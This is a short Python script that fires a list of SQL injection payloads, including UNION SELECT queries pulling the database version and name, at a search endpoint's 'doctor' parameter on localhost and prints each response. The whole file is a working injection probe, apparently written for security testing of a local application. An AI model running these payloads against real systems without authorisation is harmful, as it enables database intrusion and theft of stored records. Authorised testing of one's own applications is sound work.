import requests

TARGET_URL = "http://localhost:8080/search"  # Update the endpoint to match the actual search API

SQL_PAYLOADS = [
    "' OR '1'='1'; --",
    "' UNION SELECT null, null; --",
    "' AND 1=2 UNION SELECT version(), database(); --",
    "' AND 1=1; --",
    "' AND 1=2; --"
]

def test_sql_injection(url, field_name):
    print("[*] Testing SQL Injection on:", url)
    for payload in SQL_PAYLOADS:
        params = {field_name: payload}
        try:
            response = requests.get(url, params=params, timeout=5)
            print(f"[*] Payload: {payload}")
            print(f"Response code: {response.status_code}")
            print("Response preview:")
            print(response.text[:300])  # Print the first 300 characters of the response
        except Exception as e:
            print(f"[-] Error with payload {payload}: {e}")

if __name__ == "__main__":
    test_sql_injection(TARGET_URL, "doctor")  # Replace "doctor" with the actual field name
